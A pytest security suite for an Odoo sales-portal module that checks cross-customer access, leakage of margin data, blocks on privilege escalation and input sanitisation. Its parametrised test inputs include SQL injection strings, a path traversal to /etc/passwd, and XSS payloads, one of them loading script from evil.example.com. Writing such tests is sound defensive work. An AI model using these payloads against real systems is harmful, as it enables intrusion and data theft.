# -*- coding: utf-8 -*-
"""DealFlow360 — Principal Stress Tester 3: Security & Penetration Test Suite (Portal & IDOR).

Penetration Vectors Executed:
1. IDOR (Insecure Direct Object Reference) Attacks:
   - Customer B directly accessing /dealflow/portal/deal/{order_id_of_Customer_A} -> 403 Forbidden.
   - Customer B submitting negotiation on Customer A's quote -> 403 Forbidden.
   - Forged partner IDs in request payloads/headers -> strictly ignored in favor of authenticated partner.
   - Tampered order IDs (-1, 999999, non-numeric strings, SQL injection attempts) -> clean 404 or 400, ZERO tracebacks.
2. Pricing & Margin Data Leakage (Defense in Depth):
   - Inspect portal quote payload line by line: verify ZERO leakage of standard_price, cost_price,
     margin, margin_percent, total_cost, total_margin, or internal dealflow_risk_score.
3. Privilege Escalation Attacks:
   - Portal user attempting to confirm order directly -> MUST be rejected (AuthorizationError).
   - Portal user attempting to update order status to 'approved' -> MUST be rejected (AuthorizationError).
   - Sales Rep attempting to approve their own order exceeding 20% discount (requires Finance) -> MUST be blocked.
   - Legitimate Finance/Admin approval permitted.
4. Malicious Negotiation Payloads:
   - Negative discount requested (-20%).
   - Ridiculous discount requested (1000%).
   - XSS / script tags in customer_note and requested_terms -> sanitized / HTML-escaped.
   - Empty, null, and non-dict payloads -> clean 400 validation error, ZERO tracebacks.
"""

from __future__ import annotations

import json
from typing import Any, Dict
import pytest

from dealflow_odoo.constants import (
    APPROVAL_STATE_APPROVED,
    APPROVAL_STATE_DRAFT,
    APPROVAL_STATE_PENDING,
    DEFAULT_FINANCE_DISCOUNT_THRESHOLD,
    DEFAULT_MAX_REP_DISCOUNT,
    ERR_AUTHORIZATION,
    ERR_NOT_FOUND,
    ERR_VALIDATION,
)
from dealflow_odoo.controllers.portal import PortalController, request as portal_request
from dealflow_odoo.schemas import AuthorizationError, ValidationError


# =============================================================================
# TEST FIXTURES & HELPERS
# =============================================================================

@pytest.fixture
def portal_controller() -> PortalController:
    """Provides an isolated PortalController instance."""
    return PortalController()


@pytest.fixture
def security_users(mock_odoo_env: Any, seed_data: Dict[str, Any]) -> Dict[str, Any]:
    """Creates a complete matrix of authenticated security personas."""
    acme_partner = seed_data["customers"]["acme"]
    beta_partner = seed_data["customers"]["beta"]

    User = mock_odoo_env["res.users"]
    Partner = mock_odoo_env["res.partner"]

    customer_a = User.create({
        "id": 101,
        "name": "Alice Acme (Customer A)",
        "partner_id": acme_partner,
        "groups": {"base.group_portal", "dealflow_odoo.group_dealflow_portal"},
        "is_public": False,
    })

    customer_b = User.create({
        "id": 102,
        "name": "Bob Beta (Customer B)",
        "partner_id": beta_partner,
        "groups": {"base.group_portal", "dealflow_odoo.group_dealflow_portal"},
        "is_public": False,
    })

    guest_public = User.create({
        "id": 100,
        "name": "Unauthenticated Guest",
        "partner_id": None,
        "groups": set(),
        "is_public": True,
    })

    rep_partner = Partner.create({"id": 201, "name": "Sam Rep", "is_company": False})
    sales_rep = User.create({
        "id": 201,
        "name": "Sam Rep (Sales Rep)",
        "partner_id": rep_partner,
        "groups": {"base.group_user", "dealflow_odoo.group_dealflow_sales_rep"},
        "is_public": False,
    })

    mgr_partner = Partner.create({"id": 202, "name": "Mark Manager", "is_company": False})
    sales_manager = User.create({
        "id": 202,
        "name": "Mark Manager (Sales Manager)",
        "partner_id": mgr_partner,
        "groups": {"base.group_user", "dealflow_odoo.group_dealflow_sales_manager"},
        "is_public": False,
    })

    fin_partner = Partner.create({"id": 203, "name": "Fiona Finance", "is_company": False})
    finance_user = User.create({
        "id": 203,
        "name": "Fiona Finance (Finance Officer)",
        "partner_id": fin_partner,
        "groups": {"base.group_user", "dealflow_odoo.group_dealflow_finance"},
        "is_public": False,
    })

    admin_user = mock_odoo_env["res.users"].browse(1)

    return {
        "customer_a": customer_a,
        "customer_b": customer_b,
        "guest_public": guest_public,
        "sales_rep": sales_rep,
        "sales_manager": sales_manager,
        "finance_user": finance_user,
        "admin_user": admin_user,
    }


@pytest.fixture
def multi_customer_quotations(
    mock_odoo_env: Any,
    seed_data: Dict[str, Any],
    security_users: Dict[str, Any],
) -> Dict[str, Any]:
    """Creates discrete quotations owned by Customer A and Customer B with populated cost/margin data."""
    SaleOrder = mock_odoo_env["sale.order"]
    SaleOrderLine = mock_odoo_env["sale.order.line"]

    acme = seed_data["customers"]["acme"]
    beta = seed_data["customers"]["beta"]
    laptop = seed_data["products"]["laptop"]
    support = seed_data["products"]["support"]
    monitor = seed_data["products"]["monitor"]

    # Order A belonging to Customer A (Acme Corp)
    order_a = SaleOrder.create({
        "id": 10,
        "name": "SO-ACME-001",
        "partner_id": acme,
        "partner_shipping_id": acme,
        "user_id": security_users["sales_rep"],
        "state": "draft",
        "date_order": "2026-09-05 10:00:00",
        "dealflow_deal_id": "DEAL-ACME-SECRET-10",
        "dealflow_approval_state": APPROVAL_STATE_DRAFT,
        "dealflow_risk_score": 58.75,
        "dealflow_health_status": "healthy",
        "dealflow_locked": False,
        "amount_untaxed": 1700.0,
        "amount_tax": 170.0,
        "amount_total": 1870.0,
        "note": "Confidential internal pricing notes: Target 30% gross margin minimum.",
    })

    line_a1 = SaleOrderLine.create({
        "id": 101,
        "order_id": order_a,
        "product_id": laptop,
        "name": "Laptop Enterprise",
        "product_uom_qty": 1.0,
        "price_unit": 1200.0,
        "discount": 0.0,
        "price_subtotal": 1200.0,
        "dealflow_cost_price": 800.0,
        "dealflow_is_recurring": False,
    })

    line_a2 = SaleOrderLine.create({
        "id": 102,
        "order_id": order_a,
        "product_id": support,
        "name": "Premium 24/7 Support",
        "product_uom_qty": 1.0,
        "price_unit": 500.0,
        "discount": 0.0,
        "price_subtotal": 500.0,
        "dealflow_cost_price": 250.0,
        "dealflow_is_recurring": True,
        "dealflow_recurring_interval": "month",
    })

    from tests.conftest import MockRecordSet
    order_a.order_line = MockRecordSet([line_a1, line_a2], "sale.order.line")
    order_a._compute_blended_discount()

    # Order B belonging to Customer B (Beta Industries)
    order_b = SaleOrder.create({
        "id": 20,
        "name": "SO-BETA-001",
        "partner_id": beta,
        "partner_shipping_id": beta,
        "user_id": security_users["sales_rep"],
        "state": "draft",
        "date_order": "2026-09-05 10:30:00",
        "dealflow_deal_id": "DEAL-BETA-SECRET-20",
        "dealflow_approval_state": APPROVAL_STATE_DRAFT,
        "dealflow_risk_score": 12.0,
        "dealflow_health_status": "healthy",
        "dealflow_locked": False,
        "amount_untaxed": 300.0,
        "amount_tax": 30.0,
        "amount_total": 330.0,
        "note": "Beta standard quote.",
    })

    line_b1 = SaleOrderLine.create({
        "id": 201,
        "order_id": order_b,
        "product_id": monitor,
        "name": "Ultra-wide Monitor",
        "product_uom_qty": 1.0,
        "price_unit": 300.0,
        "discount": 0.0,
        "price_subtotal": 300.0,
        "dealflow_cost_price": 180.0,
        "dealflow_is_recurring": False,
    })

    order_b.order_line = MockRecordSet([line_b1], "sale.order.line")
    order_b._compute_blended_discount()

    return {
        "order_a": order_a,
        "order_b": order_b,
    }


def set_portal_request(env: Any, user: Any = None, data: Any = None, raw_body: bytes = None) -> None:
    """Configures simulated portal HTTP request context with optional raw bytes."""
    portal_request.env = env
    if env is not None:
        env.user = user
    portal_request.params = {}
    if raw_body is not None:
        portal_request.httprequest.data = raw_body
    elif data is not None:
        portal_request.httprequest.data = json.dumps(data).encode("utf-8")
    else:
        portal_request.httprequest.data = b""


# =============================================================================
# 1. IDOR (INSECURE DIRECT OBJECT REFERENCE) PENETRATION SUITE
# =============================================================================

class TestIDORAttacks:
    """Penetration tests attacking tenant isolation, cross-customer object references, and ID tampering."""

    def test_customer_b_cannot_read_customer_a_deal(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 1.1: Customer B directly accessing /dealflow/portal/deal/{order_id_of_Customer_A} MUST return 403."""
        order_a = multi_customer_quotations["order_a"]
        customer_b = security_users["customer_b"]

        set_portal_request(mock_odoo_env, user=customer_b)
        resp = portal_controller.portal_get_deal(order_a.id)

        assert resp.status_code == 403
        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_AUTHORIZATION
        assert "Forbidden" in payload["error"]["message"]

    def test_customer_b_cannot_negotiate_customer_a_deal(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 1.2: Customer B submitting negotiation on Customer A's quotation MUST return 403."""
        order_a = multi_customer_quotations["order_a"]
        customer_b = security_users["customer_b"]

        initial_negotiations = len(mock_odoo_env["dealflow.negotiation"].search([("sale_order_id", "=", order_a.id)]))

        set_portal_request(
            mock_odoo_env,
            user=customer_b,
            data={
                "order_id": order_a.id,
                "requested_discount": 25.0,
                "customer_note": "Attacker counter-offer on victim order",
            },
        )
        resp = portal_controller.portal_submit_negotiation()

        assert resp.status_code == 403
        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_AUTHORIZATION
        assert "Forbidden" in payload["error"]["message"]

        # Ensure no negotiation record was inserted
        current_negotiations = len(mock_odoo_env["dealflow.negotiation"].search([("sale_order_id", "=", order_a.id)]))
        assert current_negotiations == initial_negotiations
        # Ensure quotation A remains untouched
        assert order_a.dealflow_locked is False
        assert order_a.dealflow_approval_state == APPROVAL_STATE_DRAFT

    def test_forged_partner_id_in_payload_strictly_ignored(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 1.3: Forged partner IDs in request payloads MUST be ignored in favor of authenticated partner."""
        order_b = multi_customer_quotations["order_b"]
        customer_a = security_users["customer_a"]
        customer_b = security_users["customer_b"]

        # Customer B submits on their own quote, but attempts to forge partner_id as Customer A (Acme Corp: id=1)
        forged_partner_id = customer_a.partner_id.id
        set_portal_request(
            mock_odoo_env,
            user=customer_b,
            data={
                "order_id": order_b.id,
                "partner_id": forged_partner_id,
                "requested_discount": 10.0,
                "customer_note": "Attempting to spoof partner ownership",
            },
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 201

        payload = json.loads(resp.data.decode("utf-8"))
        neg_id = payload["data"]["negotiation_id"]
        neg_record = mock_odoo_env["dealflow.negotiation"].browse(neg_id)

        # Crucial Verification: Negotiation partner MUST be Customer B, NOT the spoofed Customer A!
        assert neg_record.partner_id.id == customer_b.partner_id.id
        assert neg_record.partner_id.id != forged_partner_id

    def test_forged_partner_id_cannot_bypass_idor_on_victim_quote(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 1.4: Attacker passing victim partner_id while targeting victim quotation MUST still fail 403."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]
        customer_b = security_users["customer_b"]

        set_portal_request(
            mock_odoo_env,
            user=customer_b,
            data={
                "order_id": order_a.id,
                "partner_id": customer_a.partner_id.id,  # Forging victim's own partner_id
                "requested_discount": 20.0,
            },
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 403
        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["error"]["code"] == ERR_AUTHORIZATION

    @pytest.mark.parametrize("malicious_id,expected_status", [
        (-1, 404),
        (-99999, 404),
        (0, 404),
        (999999, 404),
        ("non-numeric-string", 400),
        ("'; DROP TABLE sale_order; --", 400),
        ("' OR 1=1 --", 400),
        ("1 UNION SELECT password FROM res_users", 400),
        ("../../../etc/passwd", 400),
    ])
    def test_tampered_order_ids_read_endpoint_clean_response(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        malicious_id: Any,
        expected_status: int,
    ):
        """Vector 1.5: Tampered order IDs on GET /dealflow/portal/deal/<id> MUST return 400 or 404 cleanly, ZERO tracebacks."""
        customer_a = security_users["customer_a"]
        set_portal_request(mock_odoo_env, user=customer_a)

        resp = portal_controller.portal_get_deal(malicious_id)
        assert resp.status_code == expected_status, f"Failed for malicious ID: {malicious_id}"

        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] in (ERR_NOT_FOUND, ERR_VALIDATION)

    @pytest.mark.parametrize("malicious_id,expected_status", [
        (-1, 404),
        (0, 400),
        (999999, 404),
        ("non_numeric", 400),
        ("1; SELECT * FROM res_users", 400),
        ("' OR '1'='1", 400),
    ])
    def test_tampered_order_ids_negotiate_endpoint_clean_response(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        malicious_id: Any,
        expected_status: int,
    ):
        """Vector 1.6: Tampered order IDs in POST /dealflow/portal/negotiate MUST return 400 or 404 cleanly, ZERO tracebacks."""
        customer_a = security_users["customer_a"]
        set_portal_request(
            mock_odoo_env,
            user=customer_a,
            data={"order_id": malicious_id, "requested_discount": 10.0},
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == expected_status, f"Failed for malicious negotiation order_id: {malicious_id}"

        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] in (ERR_NOT_FOUND, ERR_VALIDATION)


# =============================================================================
# 2. PRICING & MARGIN DATA LEAKAGE (DEFENSE IN DEPTH)
# =============================================================================

class TestPricingMarginDataLeakage:
    """Tests rigorous sanitization of internal pricing metrics, profit margins, costs, and risk algorithms."""

    FORBIDDEN_INTERNAL_KEYWORDS = [
        "standard_price",
        "cost_price",
        "dealflow_cost_price",
        "dealflow_margin",
        "margin",
        "margin_percent",
        "total_cost",
        "total_margin",
        "dealflow_risk_score",
        "risk_score",
    ]

    def test_portal_read_zero_pricing_margin_leakage_line_by_line(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 2.1: Inspect portal quote payload line by line: verify ZERO leakage of sensitive internal metrics."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        set_portal_request(mock_odoo_env, user=customer_a)
        resp = portal_controller.portal_get_deal(order_a.id)
        assert resp.status_code == 200

        raw_json_str = resp.data.decode("utf-8")
        parsed = json.loads(raw_json_str)

        # 1. Global JSON String Audit: none of the forbidden internal keywords may appear anywhere in the response!
        for keyword in self.FORBIDDEN_INTERNAL_KEYWORDS:
            assert f'"{keyword}"' not in raw_json_str, f"CRITICAL SECURITY LEAK: Found internal field '{keyword}' in portal response!"

        # 2. Line Item Inspection: verify ONLY allowed commercial fields are present
        lines = parsed["data"]["lines"]
        assert len(lines) == 2

        allowed_line_keys = {
            "id",
            "product_id",
            "product_name",
            "description",
            "quantity",
            "uom",
            "price_unit",
            "discount",
            "price_subtotal",
            "price_total",
        }

        for idx, line in enumerate(lines):
            line_keys = set(line.keys())
            unexpected_keys = line_keys - allowed_line_keys
            assert not unexpected_keys, f"Line {idx} leaked unexpected internal fields: {unexpected_keys}"

            # Verify specifically forbidden keys are absent
            assert "cost_price" not in line
            assert "standard_price" not in line
            assert "margin" not in line
            assert "margin_percent" not in line

        # 3. Governance section check: ensure risk score is omitted
        governance = parsed["data"]["governance"]
        assert "dealflow_risk_score" not in governance
        assert "risk_score" not in governance
        assert "dealflow_approval_state" in governance
        assert "dealflow_locked" in governance

    def test_negotiation_submission_response_zero_leakage(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 2.2: Verify that negotiation submission response contains zero leaked costs, margins, or risk scores."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        set_portal_request(
            mock_odoo_env,
            user=customer_a,
            data={
                "order_id": order_a.id,
                "requested_discount": 15.0,
                "customer_note": "Requesting 15% discount for long term contract.",
            },
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 201

        raw_json_str = resp.data.decode("utf-8")
        for keyword in self.FORBIDDEN_INTERNAL_KEYWORDS:
            assert f'"{keyword}"' not in raw_json_str, f"CRITICAL LEAK in negotiation response: '{keyword}'"


# =============================================================================
# 3. PRIVILEGE ESCALATION ATTACKS
# =============================================================================

class TestPrivilegeEscalationAttacks:
    """Penetration tests verifying role boundaries, permission ceilings, and approval authority isolation."""

    def test_portal_user_cannot_confirm_order_directly(
        self,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 3.1: Portal user attempting to confirm order directly MUST be rejected."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        # Ensure order is unlocked and in draft state with 0% discount
        order_a.dealflow_locked = False
        order_a.dealflow_approval_state = APPROVAL_STATE_DRAFT
        mock_odoo_env.user = customer_a

        with pytest.raises(AuthorizationError) as exc_info:
            order_a.action_confirm()

        assert "Portal users cannot confirm sales orders directly" in str(exc_info.value)
        assert order_a.state == "draft"

    def test_portal_user_cannot_update_order_status_to_approved(
        self,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 3.2: Portal user attempting to update order approval status to 'approved' MUST be rejected."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        mock_odoo_env.user = customer_a

        # 1. Direct write attempt on dealflow_approval_state
        with pytest.raises(AuthorizationError) as exc_info:
            order_a.write({"dealflow_approval_state": APPROVAL_STATE_APPROVED})

        assert "Portal users cannot update order approval state" in str(exc_info.value)
        assert order_a.dealflow_approval_state != APPROVAL_STATE_APPROVED

        # 2. Direct apply_approved_change invocation
        with pytest.raises(AuthorizationError) as exc_apply:
            order_a.action_dealflow_apply_approved_change({"discount": 10.0})

        assert "Portal users cannot apply approved changes" in str(exc_apply.value)
        assert order_a.dealflow_approval_state != APPROVAL_STATE_APPROVED

    def test_portal_user_cannot_approve_negotiation_record(
        self,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 3.3: Portal user cannot self-approve their own negotiation request."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        mock_odoo_env.user = customer_a
        neg = mock_odoo_env["dealflow.negotiation"].create({
            "sale_order_id": order_a.id,
            "requested_discount": 15.0,
            "status": "submitted",
        })

        with pytest.raises(AuthorizationError) as exc_info:
            neg.action_approve()

        assert "Portal users cannot approve negotiations" in str(exc_info.value)
        assert neg.status == "submitted"
        assert order_a.dealflow_approval_state != APPROVAL_STATE_APPROVED

    def test_sales_rep_cannot_approve_order_exceeding_20_percent_discount(
        self,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 3.4: Sales Rep attempting to approve their own order exceeding 20% discount MUST be blocked (Finance required)."""
        order_a = multi_customer_quotations["order_a"]
        sales_rep = security_users["sales_rep"]

        # Configure high discount negotiation (25.0% > 20.0% Finance ceiling)
        neg = mock_odoo_env["dealflow.negotiation"].create({
            "sale_order_id": order_a.id,
            "requested_discount": 25.0,
            "status": "submitted",
        })

        # Sales Rep attempts to approve this 25% discount negotiation
        mock_odoo_env.user = sales_rep

        with pytest.raises(AuthorizationError) as exc_neg:
            neg.action_approve()

        assert "Finance approval" in str(exc_neg.value)
        assert neg.status == "submitted"
        assert order_a.dealflow_approval_state != APPROVAL_STATE_APPROVED

        # Sales Rep attempts action_dealflow_apply_approved_change with 25% discount
        with pytest.raises(AuthorizationError) as exc_apply:
            order_a.action_dealflow_apply_approved_change({"discount": 25.0})

        assert "Finance approval required" in str(exc_apply.value) or "exceeding 20.0%" in str(exc_apply.value)
        assert order_a.dealflow_approval_state != APPROVAL_STATE_APPROVED

    def test_finance_officer_can_approve_order_exceeding_20_percent_discount(
        self,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 3.5: Legitimate Finance officer CAN approve an order with >20% discount."""
        order_a = multi_customer_quotations["order_a"]
        finance_user = security_users["finance_user"]

        neg = mock_odoo_env["dealflow.negotiation"].create({
            "sale_order_id": order_a.id,
            "requested_discount": 25.0,
            "status": "submitted",
        })

        mock_odoo_env.user = finance_user
        res = neg.action_approve(review_note="Finance approval granted per CFO approval policy.")
        assert res is True
        assert neg.status == "approved"
        assert order_a.dealflow_approval_state == APPROVAL_STATE_APPROVED
        assert order_a.dealflow_locked is False


# =============================================================================
# 4. MALICIOUS NEGOTIATION PAYLOADS
# =============================================================================

class TestMaliciousNegotiationPayloads:
    """Penetration tests attacking parameter boundary validation, XSS escaping, and malformed inputs."""

    def test_negative_discount_rejected(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 4.1: Negative discount requested (-20%) MUST return HTTP 400."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        set_portal_request(
            mock_odoo_env,
            user=customer_a,
            data={"order_id": order_a.id, "requested_discount": -20.0},
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 400

        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_VALIDATION
        assert "between 0.0% and 100.0%" in payload["error"]["message"]

    def test_ridiculous_discount_rejected(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 4.2: Ridiculous discount requested (1000%) MUST return HTTP 400."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        set_portal_request(
            mock_odoo_env,
            user=customer_a,
            data={"order_id": order_a.id, "requested_discount": 1000.0},
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 400

        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_VALIDATION
        assert "between 0.0% and 100.0%" in payload["error"]["message"]

    def test_xss_script_tags_neutralized_in_note_and_terms(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
        multi_customer_quotations: Dict[str, Any],
    ):
        """Vector 4.3: XSS / script tags in customer_note and requested_terms MUST be safely neutralized / HTML-escaped."""
        order_a = multi_customer_quotations["order_a"]
        customer_a = security_users["customer_a"]

        xss_note = "<script>alert('XSS-NOTE')</script><img src=x onerror=stealCookies()>"
        xss_terms = "<script src='https://evil.example.com/payload.js'></script>"

        set_portal_request(
            mock_odoo_env,
            user=customer_a,
            data={
                "order_id": order_a.id,
                "requested_discount": 15.0,
                "requested_terms": xss_terms,
                "customer_note": xss_note,
            },
        )
        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 201

        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is True

        neg_id = payload["data"]["negotiation_id"]
        neg_record = mock_odoo_env["dealflow.negotiation"].browse(neg_id)

        # 1. Verify that stored fields have HTML script tags neutralized / escaped
        assert "<script>" not in neg_record.customer_note
        assert "&lt;script&gt;" in neg_record.customer_note
        assert "<script" not in neg_record.requested_terms
        assert "&lt;script" in neg_record.requested_terms

        # 2. Verify chatter messages contain ZERO unescaped executable script tags
        for chatter_msg in order_a.chatter_messages:
            assert "<script>" not in chatter_msg, f"Stored XSS vulnerability in order chatter! Message: {chatter_msg}"

    def test_empty_payload_handled_cleanly(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
    ):
        """Vector 4.4a: Empty JSON object `{}` MUST return HTTP 400 Validation Error, ZERO tracebacks."""
        customer_a = security_users["customer_a"]
        set_portal_request(mock_odoo_env, user=customer_a, data={})

        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 400
        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_VALIDATION

    def test_null_payload_handled_cleanly(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
    ):
        """Vector 4.4b: Null HTTP body `b"null"` MUST return HTTP 400 Validation Error, ZERO tracebacks."""
        customer_a = security_users["customer_a"]
        set_portal_request(mock_odoo_env, user=customer_a, raw_body=b"null")

        resp = portal_controller.portal_submit_negotiation()
        assert resp.status_code == 400
        payload = json.loads(resp.data.decode("utf-8"))
        assert payload["success"] is False
        assert payload["error"]["code"] == ERR_VALIDATION

    def test_non_dict_json_payloads_handled_cleanly(
        self,
        portal_controller: PortalController,
        mock_odoo_env: Any,
        security_users: Dict[str, Any],
    ):
        """Vector 4.4c: Non-dict JSON payloads (`b"\"string\""` and `b"[1, 2, 3]"`) MUST return HTTP 400, ZERO tracebacks."""
        customer_a = security_users["customer_a"]

        # String payload
        set_portal_request(mock_odoo_env, user=customer_a, raw_body=b'"just a string"')
        resp_str = portal_controller.portal_submit_negotiation()
        assert resp_str.status_code == 400
        payload_str = json.loads(resp_str.data.decode("utf-8"))
        assert payload_str["error"]["code"] == ERR_VALIDATION

        # Array payload
        set_portal_request(mock_odoo_env, user=customer_a, raw_body=b'[{"order_id": 10}]')
        resp_arr = portal_controller.portal_submit_negotiation()
        assert resp_arr.status_code == 400
        payload_arr = json.loads(resp_arr.data.decode("utf-8"))
        assert payload_arr["error"]["code"] == ERR_VALIDATION
